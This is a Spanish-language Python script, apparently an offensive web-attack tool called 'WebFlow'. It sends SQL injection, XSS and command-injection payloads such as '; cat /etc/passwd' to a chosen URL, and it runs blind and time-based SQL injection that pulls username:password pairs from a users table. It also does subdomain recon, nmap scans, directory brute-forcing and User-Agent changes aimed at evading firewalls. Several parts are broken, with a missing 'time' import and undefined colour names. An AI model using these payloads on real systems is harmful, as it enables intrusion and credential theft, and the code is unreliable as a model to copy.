#!/usr/bin/env python3

import os
import subprocess
import requests
from lxml import html
from urllib.parse import urlparse
from tqdm import tqdm
from string import printable
from time import sleep
import sys
from termcolor import colored

# Definición de colores
class Colores:
    VERDE = "\033[92m"
    ROJO = "\033[91m"
    AMARILLO = "\033[93m"
    CYAN = "\033[96m"
    AZUL = "\033[94m"
    RESET = "\033[0m"

def imprimir_banner():
    """Imprime un banner de bienvenida."""
    banner = r"""
██╗    ██╗███████╗██████╗ ███████╗██╗      ██████╗ ██╗    ██╗
██║    ██║██╔════╝██╔══██╗██╔════╝██║     ██╔═══██╗██║    ██║
██║ █╗ ██║█████╗  ██████╔╝█████╗  ██║     ██║   ██║██║ █╗ ██║
██║███╗██║██╔══╝  ██╔══██╗██╔══╝  ██║     ██║   ██║██║███╗██║
╚███╔███╔╝███████╗██████╔╝██║     ███████╗╚██████╔╝╚███╔███╔╝
 ╚══╝╚══╝ ╚══════╝╚═════╝ ╚═╝     ╚══════╝ ╚═════╝  ╚══╝╚══╝ 
                                                                                                           
                                     by TheOffSecGirl
    """
    print(Colores.VERDE + banner + Colores.RESET)

def validar_url(url):
    """Valida que la URL sea correcta."""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def verificar_csrf(formulario):
    """Verifica si hay un token CSRF en el formulario."""
    csrf_token = formulario.xpath('//input[@name="csrf_token"]')
    if not csrf_token:
        print(Colores.AMARILLO + "⚠️ Posible vulnerabilidad CSRF en el formulario." + Colores.RESET)
    else:
        print(Colores.VERDE + "✅ Token CSRF encontrado." + Colores.RESET)

def verificar_inyeccion_sql(url, user_agent=None):
    """Verifica inyección SQL enviando payloads comunes."""
    payloads = ["' OR 1=1--", "' OR 'a'='a", "' OR 1=1#", "' AND 1=1--"]
    headers = {'User-Agent': user_agent} if user_agent else {}
    vulnerable = False
    for payload in payloads:
        try:
            response = requests.get(f"{url}{payload}", headers=headers, timeout=10)
            if "SQL" in response.text or "syntax" in response.text:
                print(Colores.AMARILLO + f"⚠️ Posible vulnerabilidad de inyección SQL con el payload: {payload}" + Colores.RESET)
                vulnerable = True
        except requests.RequestException as e:
            print(Colores.ROJO + f"❌ Error al verificar inyección SQL avanzada: {e}" + Colores.RESET)
    if not vulnerable:
        print(Colores.VERDE + "✅ No se detectaron inyecciones SQL." + Colores.RESET)

def verificar_xss(url, user_agent=None):
    """Verifica vulnerabilidades XSS enviando payloads comunes."""
    payload = "<script>alert('XSS')</script>"
    headers = {'User-Agent': user_agent} if user_agent else {}
    try:
        response = requests.get(url, params={"q": payload}, headers=headers, timeout=10)
        if payload in response.text:
            print(Colores.AMARILLO + "⚠️ Posible vulnerabilidad de Cross-Site Scripting (XSS) reflejado." + Colores.RESET)
        else:
            print(Colores.VERDE + "✅ No se detectaron vulnerabilidades XSS reflejado." + Colores.RESET)
    except requests.RequestException as e:
        print(Colores.ROJO + f"❌ Error al verificar XSS avanzado: {e}" + Colores.RESET)

def verificar_inyeccion_comando(url, user_agent=None):
    """Verifica inyección de comandos enviando payloads comunes."""
    payloads = ["; ls", "; cat /etc/passwd"]
    headers = {'User-Agent': user_agent} if user_agent else {}
    vulnerable = False
    for payload in payloads:
        try:
            response = requests.get(f"{url}{payload}", headers=headers, timeout=10)
            if "root:" in response.text:
                print(Colores.AMARILLO + f"⚠️ Posible vulnerabilidad de inyección de comandos con el payload: {payload}" + Colores.RESET)
                vulnerable = True
        except requests.RequestException as e:
            print(Colores.ROJO + f"❌ Error al verificar inyección de comandos: {e}" + Colores.RESET)
    if not vulnerable:
        print(Colores.VERDE + "✅ No se detectaron inyecciones de comandos." + Colores.RESET)

def verificar_encabezados_http(url, user_agent=None):
    """Verifica la seguridad de los encabezados HTTP."""
    headers = {'User-Agent': user_agent} if user_agent else {}
    try:
        response = requests.get(url, headers=headers, timeout=10)
        if "X-Content-Type-Options" not in response.headers:
            print(Colores.AMARILLO + "⚠️ Falta encabezado X-Content-Type-Options" + Colores.RESET)
        if "X-XSS-Protection" not in response.headers:
            print(Colores.AMARILLO + "⚠️ Falta encabezado X-XSS-Protection" + Colores.RESET)
        if "X-Frame-Options" not in response.headers:
            print(Colores.AMARILLO + "⚠️ Falta encabezado X-Frame-Options" + Colores.RESET)
        if "Strict-Transport-Security" not in response.headers:
            print(Colores.AMARILLO + "⚠️ Falta encabezado Strict-Transport-Security" + Colores.RESET)
        if "Content-Security-Policy" not in response.headers:
            print(Colores.AMARILLO + "⚠️ Falta encabezado Content-Security-Policy" + Colores.RESET)
        print(Colores.VERDE + "✅ Encabezados HTTP revisados." + Colores.RESET)
    except requests.RequestException as e:
        print(Colores.ROJO + f"❌ Error al verificar encabezados HTTP: {e}" + Colores.RESET)

def escanear_vulnerabilidades(url, opciones, user_agent=None):
    """Escanea la URL en busca de las vulnerabilidades seleccionadas."""
    if not validar_url(url):
        print(Colores.ROJO + "❌ URL inválida. Por favor, ingrese una URL válida." + Colores.RESET)
        return

    try:
        headers = {'User-Agent': user_agent} if user_agent else {}
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()  # Lanza un error si la solicitud no fue exitosa
        root = html.fromstring(response.content)

        # Verificar vulnerabilidades según las opciones seleccionadas
        formularios = root.xpath('//form')
        for formulario in formularios:
            if 'csrf' in opciones:
                verificar_csrf(formulario)
        if 'sql' in opciones:
            verificar_inyeccion_sql(url, user_agent)
        if 'xss' in opciones:
            verificar_xss(url, user_agent)
        if 'comando' in opciones:
            verificar_inyeccion_comando(url, user_agent)
        if 'encabezados' in opciones:
            verificar_encabezados_http(url, user_agent)

    except requests.RequestException as e:
        print(Colores.ROJO + f"❌ Error al escanear la URL: {e}" + Colores.RESET)

def main_url_input():
    return input(Colores.AZUL + "Ingrese la URL principal para realizar el ataque: " + Colores.RESET).strip()

def user_agent_input():
    return input(Colores.AZUL + "Ingrese el User-Agent a utilizar (deje vacío para usar el predeterminado): " + Colores.RESET).strip()

def configure_headers(user_agent):
    return {"User-Agent": user_agent if user_agent else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}

def makeSQLI(main_url, headers):
    p1 = Progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta...")

    extracted_info = ""
    for position in tqdm(range(1, 150), desc="Fuerza bruta"):
        for character in range(33, 126):
            sqli_url = f"{main_url}?id=0 or (select(select ascii(substring(select group_concat(username,0x3a,password) from users), {position},1)) from users where id = 1)={character}"
            p1.status(colored(f"[+] {sqli_url} iniciado...", Colores.GREEN))
            
            try:
                r = requests.get(sqli_url, headers=headers)
            except requests.RequestException as e:
                print(colored(f"[!] Error en la solicitud: {e}", Colores.RED))
                sys.exit(1)
            
            if r.status_code == 200:  
                extracted_info += chr(character)
                p1.status(colored(f"[*] {extracted_info}", Colores.BLUE))
                break

def makeTimeBasedSQLI(main_url, headers):
    p1 = Progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta...")

    extracted_info = ""
    for position in tqdm(range(1, 150), desc="Fuerza bruta"):
        for character in range(33, 126):
            sqli_url = f"{main_url}?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users), {position},1))={character}, sleep(0.35), 1)"
            p1.status(colored(f"[+] {sqli_url} iniciado...", Colores.GREEN))

            time_start = time.time()

            try:
                r = requests.get(sqli_url, headers=headers)
            except requests.RequestException as e:
                print(colored(f"[!] Error en la solicitud: {e}", Colores.RED))
                sys.exit(1)

            time_end = time.time()

            if time_end - time_start > 0.35:  
                extracted_info += chr(character)
                p1.status(colored(f"[*] {extracted_info}", Colores.BLUE))
                break

class Progress:
    def __init__(self, task_name):
        self.task_name = task_name
        print(colored(f"[+] {self.task_name} iniciado...", Colores.VERDE))
        print(colored(f"[+] {self.task_name} iniciado...", Colores.AZUL))

    def status(self, message):
        print(colored(f"[*] {self.task_name}: {message}", Colores.CYAN))

def sql_injection_menu(main_url, headers):
    print(Colores.AZUL + "\nSeleccione el tipo de SQLi:" + Colores.RESET)
    print(Colores.CYAN + "1. Conditional SQLi" + Colores.RESET)
    print(Colores.CYAN + "2. Time-Based SQLi" + Colores.RESET)
    choice = input(Colores.AZUL + "Ingrese su elección (1 o 2): " + Colores.RESET).strip()

    if choice == "1":
        makeSQLI(main_url, headers)
    elif choice == "2":
        makeTimeBasedSQLI(main_url, headers)
    else:
        print(Colores.ROJO + "[!] Opción no válida." + Colores.RESET)

def reconocimiento_dominio(dominio, user_agent=None):
    print(Colores.AZUL + f"[*] Iniciando reconocimiento de subdominios para {dominio}" + Colores.RESET)
    subfinder_cmd = f"subfinder -d {dominio} -silent -o subdomains.txt"
    httpx_cmd = f"httpx -l subdomains.txt -silent -o active_subdomains.txt"

    if user_agent:
        subfinder_cmd += f" --header 'User-Agent: {user_agent}'"
        httpx_cmd += f" --header 'User-Agent: {user_agent}'"

    try:
        subprocess.run(subfinder_cmd, shell=True, check=True)
        print(Colores.VERDE + "[+] Subfinder completado. Subdominios guardados en subdomains.txt" + Colores.RESET)
        subprocess.run(httpx_cmd, shell=True, check=True)
        print(Colores.VERDE + "[+] HTTPX completado. Subdominios activos guardados en active_subdomains.txt" + Colores.RESET)
    except subprocess.CalledProcessError as e:
        print(Colores.ROJO + f"❌ Error en el reconocimiento de subdominios: {e}" + Colores.RESET)

def escaneo_puertos():
    print(Colores.AZUL + "[*] Iniciando escaneo de puertos en subdominios activos" + Colores.RESET)

    # Verificar si el archivo contiene subdominios
    if os.path.isfile("active_subdomains.txt") and os.path.getsize("active_subdomains.txt") > 0:
        nmap_cmd = "nmap -iL active_subdomains.txt -T4 -F -oN nmap_scan.txt"
        try:
            subprocess.run(nmap_cmd, shell=True, check=True)
            print(Colores.VERDE + "[+] Escaneo de puertos completado. Resultados guardados en nmap_scan.txt" + Colores.RESET)
        except subprocess.CalledProcessError as e:
            print(Colores.ROJO + f"❌ Error en el escaneo de puertos: {e}" + Colores.RESET)
    else:
        print(Colores.ROJO + "❌ No se encontraron subdominios activos para escanear." + Colores.RESET)

def enumerar_directorios(url, wordlist_path, user_agent=None):
    """Enumera directorios utilizando una lista de palabras (wordlist)."""
    headers = {'User-Agent': user_agent} if user_agent else {}
    with open(wordlist_path, 'r') as wordlist:
        for word in wordlist:
            word = word.strip()
            full_url = f"{url}/{word}"
            try:
                response = requests.get(full_url, headers=headers, timeout=10)
                if response.status_code == 200:
                    print(Colores.AMARILLO + f"✅ Directorio encontrado: {full_url}" + Colores.RESET)
                elif response.status_code == 404:
                    print(Colores.VERDE + f"✅ Directorio no encontrado: {full_url}" + Colores.RESET)
            except requests.RequestException as e:
                print(Colores.ROJO + f"❌ Error al verificar directorio: {full_url} - {e}" + Colores.RESET)

if __name__ == "__main__":
    imprimir_banner()  # Imprime el banner al inicio

    while True:
        print(Colores.AZUL + "\nSeleccione la tarea que desea realizar:" + Colores.RESET)
        print(Colores.CYAN + "1. Análisis de vulnerabilidades en URL" + Colores.RESET)
        print(Colores.CYAN + "2. Reconocimiento de subdominios" + Colores.RESET)
        print(Colores.CYAN + "3. Escaneo de puertos" + Colores.RESET)
        print(Colores.CYAN + "4. Todas las anteriores" + Colores.RESET)
        print(Colores.CYAN + "5. SQL Injection" + Colores.RESET)
        print(Colores.CYAN + "6. Enumerar directorios" + Colores.RESET)
        print(Colores.CYAN + "7. Salir" + Colores.RESET)

        tarea = input(Colores.AZUL + "Ingrese el número de la opción: " + Colores.RESET)

        # Preguntar si desea usar un User-Agent personalizado
        usar_agente = input(Colores.AZUL + "¿Deseas añadir un User-Agent personalizado para evitar bloqueos del WAF? (y/n): " + Colores.RESET)
        user_agent = None
        if usar_agente.lower() == 'y':
            user_agent = input(Colores.AZUL + "Introduce el User-Agent que deseas usar: " + Colores.RESET)

        if tarea == '1':
            url_a_escanear = input(Colores.AZUL + "Ingrese la URL a escanear: " + Colores.RESET)
            print(Colores.AZUL + "Seleccione las vulnerabilidades a comprobar:" + Colores.RESET)
            print(Colores.CYAN + "1. CSRF" + Colores.RESET)
            print(Colores.CYAN + "2. Inyección SQL" + Colores.RESET)
            print(Colores.CYAN + "3. XSS" + Colores.RESET)
            print(Colores.CYAN + "4. Inyección de Comandos" + Colores.RESET)
            print(Colores.CYAN + "5. Encabezados HTTP" + Colores.RESET)
            print(Colores.CYAN + "6. Todas" + Colores.RESET)

            seleccion = input(Colores.AZUL + "Ingrese el número de la opción: " + Colores.RESET)

            opciones_seleccionadas = []
            if seleccion == '1':
                opciones_seleccionadas.append('csrf')
            elif seleccion == '2':
                opciones_seleccionadas.append('sql')
            elif seleccion == '3':
                opciones_seleccionadas.append('xss')
            elif seleccion == '4':
                opciones_seleccionadas.append('comando')
            elif seleccion == '5':
                opciones_seleccionadas.append('encabezados')
            elif seleccion == '6':
                opciones_seleccionadas = ['csrf', 'sql', 'xss', 'comando', 'encabezados']
            else:
                print(Colores.ROJO + "[!] Opción no válida." + Colores.RESET)
                continue

            escanear_vulnerabilidades(url_a_escanear, opciones_seleccionadas, user_agent)

        elif tarea == '2':
            dominio = input(Colores.AZUL + "Ingrese el dominio para el reconocimiento: " + Colores.RESET)
            reconocimiento_dominio(dominio, user_agent)

        elif tarea == '3':
            escaneo_puertos()

        elif tarea == '4':
            dominio = input(Colores.AZUL + "Ingrese el dominio para el reconocimiento y escaneo: " + Colores.RESET)
            reconocimiento_dominio(dominio, user_agent)
            escaneo_puertos()

        elif tarea == '5':
            main_url = main_url_input()
            headers = configure_headers(user_agent)
            sql_injection_menu(main_url, headers)

        elif tarea == '6':
            url = input(Colores.AZUL + "Ingrese la URL base para enumerar directorios: " + Colores.RESET)
            wordlist_path = input(Colores.AZUL + "Ingrese la ruta de la wordlist: " + Colores.RESET)
            enumerar_directorios(url, wordlist_path, user_agent)

        elif tarea == '7':
            print(Colores.VERDE + "\n[✓] ¡Hasta luego!" + Colores.RESET)
            break

        else:
            print(Colores.ROJO + "[!] Opción no válida." + Colores.RESET)
